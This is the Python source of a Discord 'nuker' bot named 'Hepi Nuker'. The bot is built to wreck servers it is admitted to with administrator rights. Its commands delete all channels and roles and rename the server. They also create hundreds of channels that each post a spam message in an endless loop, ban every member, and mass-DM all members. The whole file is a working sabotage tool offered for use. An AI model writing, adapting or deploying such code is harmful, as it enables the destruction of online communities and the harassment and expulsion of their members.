#Do not mess with this file if you do not know what you are doing, and enable all intents on discord developer portal or the bot wont work.

#-----------------------------#

import random
import discord
from discord.ext import commands
import colorama
from colorama import Fore
import time
import json
import datetime


with open('setup.json') as f:
    setup = json.load(f)
prefix = setup.get("prefix")
token = setup.get("bot_token")
bot_status = setup.get("bot_status")
spam_message = setup.get("spam_message")
channel_names = setup.get("channel_names")
server_name = setup.get("server_name")
role_names = setup.get("role_names")
intents = discord.Intents.all()
bot = commands.Bot(command_prefix=prefix, help_command=None, case_insensitive=True, intents=intents)

def clear():
  print("\x1B[2J")

def main():
  try:
    bot.run(token)
  except:
    print(Fore.RED + "Enter an appropriate bot token or enable all intents.")

class hepi:
  __version__ = "2.0.0"
  __author__ = "DaredeviL"


@bot.event
async def on_ready():
  clear()
  activity = discord.Game(name=bot_status, type=4)
  await bot.change_presence(status=discord.Status.online, activity=activity)
  with open("nuke_logs.txt", "a") as f:
    f.write(f'--------------------\nNuker started\n{datetime.datetime.now()}\n--------------------\n\n')
  print(f'''{Fore.RED}
██╗░░██╗███████╗██████╗░██╗
██║░░██║██╔════╝██╔══██╗██║
███████║█████╗░░██████╔╝██║
██╔══██║██╔══╝░░██╔═══╝░██║
██║░░██║███████╗██║░░░░░██║
╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝{Fore.RED}
▒ ░░   ░░ ▒░ ░░ ▒▓ ░▒▓░░ ▒░ 
    ░     ░ ░  ░  ░▒ ░ ▒░░  
  ░         ░     ░░   ░ ░    
            ░  ░   ░     

{Fore.RESET}{Fore.YELLOW}
███╗░░██╗██╗░░░██╗██╗░░██╗███████╗██████╗░
████╗░██║██║░░░██║██║░██╔╝██╔════╝██╔══██╗
██╔██╗██║██║░░░██║█████═╝░█████╗░░██████╔╝
██║╚████║██║░░░██║██╔═██╗░██╔══╝░░██╔══██╗
██║░╚███║╚██████╔╝██║░╚██╗███████╗██║░░██║
╚═╝░░╚══╝░╚═════╝░╚═╝░░╚═╝╚══════╝╚═╝░░╚═╝

{Fore.RESET}
------Bot Information------

bot: {Fore.MAGENTA}{bot.user}
{Fore.RESET}
token: {Fore.YELLOW}{token}
{Fore.RESET}
help command: {Fore.CYAN}{bot.command_prefix}secret
{Fore.RESET}
Current Status: {Fore.GREEN}{bot_status}
{Fore.RESET}
Invite URL: {Fore.BLUE}https://discord.com/oauth2/authorize?client_id={bot.user.id}&scope=bot&permissions=8''')

bot.ti = "Hepi Nuker"
bot.fo = "Version 2.0.0"
bot.co = 927280

@bot.command()
async def secret(ctx):
  await ctx.message.delete()
  embed = discord.Embed(title=bot.ti, color=bot.co, description=f'**{prefix}destroy**\ndestroys the server.\n\n**{prefix}spamall** `<message>`\nspams the provided text on every channel in the server.\n\n**{prefix}fuckroles** `<role names>`\ndeletes all roles and creates a lot of new roles named with the message provided.\n\n**{prefix}ball**\nbans every member(only works if the bot has a higher role then any other members)\n\n**{prefix}massdm**\ndms everyone if their dms are opened.')
  embed.set_thumbnail(url="https://cdn.discordapp.com/attachments/837292505921093684/838647405251264562/unknown-7.png")
  embed.set_footer(text=bot.fo)
  await ctx.author.send(embed=embed)
  await ctx.send('check dms')



@bot.command(aliases=['wizz'])
async def destroy(ctx):
  await ctx.message.delete()
  guild = ctx.message.guild
  bedded = discord.Embed(title=f"Nuking {ctx.guild.name}...", color=694200)
  h = await ctx.author.send(embed=bedded)
  for channel in ctx.guild.channels:
    await channel.delete()
    print(f'{Fore.GREEN}channel deleted{Fore.RED}(-)\n{Fore.WHITE}Channel name: {Fore.CYAN}#{channel.name}' + Fore.RESET)
  await h.edit(embed=discord.Embed(title=f"Nuking {ctx.guild.name}...", color=694200, description='✓ Deleted all channels'))
  with open("nuke_logs.txt", "a") as f:
    f.write(f'server: {ctx.guild.name}, {len(ctx.guild.members)} members\nuser: {ctx.author}\naction: Nuked Server\n{datetime.datetime.now()}\n\n')
    f.close()
  await ctx.guild.edit(name=server_name)
  print(f'{Fore.GREEN}server name was changed{Fore.YELLOW}(⎌)')
  await h.edit(embed=discord.Embed(title=f"Nuking {ctx.guild.name}...", color=694200, description='✓ Deleted all channels\n✓ Changed Server Name'))
  await h.edit(embed=discord.Embed(title=f"Nuke complete", color=249600, description='✓ Deleted all channels\n✓ Changed Server Name\n✓ Channel spam has started'))
  for i in range(499):
    await guild.create_text_channel(channel_names)


@bot.command()
async def massdm(ctx, *, message=None):
  await ctx.message.delete()
  if message == None:
    await ctx.author.send("provide a text to massdm.")
    return
  await ctx.author.send("Now massdming")
  for user in list(ctx.guild.members):
    try:
      await user.send(message)
      print(f"{Fore.GREEN}the dm has been Sent To {user}")
    except:
      pass
      print(f"{Fore.RED}couldnt dm {user}")
  with open("nuke_logs.txt", "a") as f:
    f.write(f'server: {ctx.guild.name}, {len(ctx.guild.members)} members\nuser: {ctx.author}\naction: Massdmed Server\nmessage: {message}\n{datetime.datetime.now()}\n\n')
    f.close()


print('Hepi Nuker')


passcode = input('\nPasscode\n>')
if passcode == "6944":
  print(f"{Fore.GREEN}Passcode was correct :D\n{Fore.RESET}")
  time.sleep(2)
  clear()
  print("Now pick an option")
  time.sleep(0.8)
  print("(1) Start the nuker")
  time.sleep(0.8)
  print("(2) customize the help command and start the nuker")
  time.sleep(0.8)
  print("(3) Clear nuke logs")
  time.sleep(0.8)
  print("(4) View credits")
else:
  print(f"{Fore.RED}The provided passcode was incorrect.")
  time.sleep(2)
  exit()

nums = "1", "3", "2", "4"

opt = input(">")



if opt not in nums:
  print(f"{Fore.RED}pick a valid option next time.")
  time.sleep(2)
  exit()
elif opt == "1":
  print("starting nuker...")
elif opt == "2":
  m = input("Embed Title\n>")
  if m is None:
    print(f"{Fore.RED}The title of the embed message cannot be none.")
    time.sleep(2)
    exit()
  bot.ti = m
  g = input("Embed Footer\n>")
  if g is None:
    print(f"{Fore.RED}The Footer of the embed message cannot be none.")
    time.sleep(2)
    exit()
  bot.fo = g
  c = input("Embed Colour\n>")
  if c is None:
    print(f"{Fore.RED}The colour of the embed message cannot be none.")
    time.sleep(2)
    exit()
  if c.isnumeric() == False:
    print(f"{Fore.RED}the embed color must be a number.")
    time.sleep(2)
    exit()
  bot.co = int(c)
  time.sleep(1)
  print("custom help has been set!")
  time.sleep(1)
  print("starting nuker...")
elif opt == "3":
  with open("nuke_logs.txt", "w") as f:
    f.write('\n')
  print(f"{Fore.GREEN}Nuke logs has been cleared.")
  time.sleep(2)
  exit()
elif opt == "4":
  print(f'''

{Fore.RED}Youtube channel: {Fore.WHITE}https://youtube.com/channel/UCIGomE0ob75e4mtVoEE2sKg

{Fore.CYAN}Discord server: {Fore.WHITE}https://discord.gg/9WfVMuRUbF

{Fore.GREEN}version: {Fore.RESET}{hepi.__version__}

{Fore.GREEN}author: {Fore.RESET}{hepi.__author__}

''')
  time.sleep(2)
  exit()

@bot.event
async def on_guild_channel_create(channel):
  print(f"{Fore.GREEN}channel created(+)")
  while True:
    await channel.send(spam_message)

@bot.event
async def on_guild_channel_delete(channel):
  guild = channel.guild
  for role in guild.roles:
    try:
      await role.delete()
      print(f'{Fore.GREEN}role deleted{Fore.RED}(-)\n{Fore.RESET}role name: {Fore.BLUE}{role.name}')
    except:
      pass
  for i in range(249):
    await guild.create_role(name=role_names)
    print(f'{Fore.BLUE}role created')

@bot.command()
async def spamall(ctx, *, message=''):
  if message == '':
    await ctx.author.send("provide. message to spam.")
  else:
    with open("nuke_logs.txt", "a") as f:
      f.write(f'server: {ctx.guild.name}, {len(ctx.guild.members)} members\nuser: {ctx.author}\naction: Spammed Server\nmessage: {message}\n{datetime.datetime.now()}\n\n')
    f.close()
    channels = ctx.guild.text_channels
    await ctx.author.send('Now spamming')
    while True:
      for channel in channels:
        await channel.send(message)

@bot.command()
async def fuckroles(ctx, *, rolename=''):
  if rolename == '':
    await ctx.author.send('provide a role name.')
  else:
    roles = ctx.message.guild
    await ctx.author.send("deleting roles...")
    for role in roles.roles:
      try:
        await role.delete()
      except:
        pass
    await ctx.author.send("creating roles...")
    with open("nuke_logs.txt", "a") as f:
      f.write(f'server: {ctx.guild.name}, {len(ctx.guild.members)} members\nuser: {ctx.author}\naction: Fucked Roles\nRole Names: {rolename}\n{datetime.datetime.now()}\n\n')
      f.close()
    for i in range(249):
      await roles.create_role(name=rolename)

@bot.command()
async def ball(ctx):
  await ctx.message.delete()
  await ctx.author.send("banning all members...")
  for user in list(ctx.guild.members):
     try:
        await user.ban(reason="T'_T")
     except:
         pass
  with open("nuke_logs.txt", "a") as f:
    f.write(f'server: {ctx.guild.name}, {len(ctx.guild.members)} members\nuser: {ctx.author}\naction: Massbanned Server\n{datetime.datetime.now()}\n\n')
    f.close()


@bot.event
async def on_command_error(ctx, error):
  await ctx.message.delete()
  with open("nuke_logs.txt", "w") as f:
    f.write(f'{ctx.author} tried executing a command but an error has occurred.\n{datetime.datetime.now()}')
  embed = discord.Embed(title="ERROR", description=f"```py\n{error}\n```")
  await ctx.author.send(embed=embed)
  


main()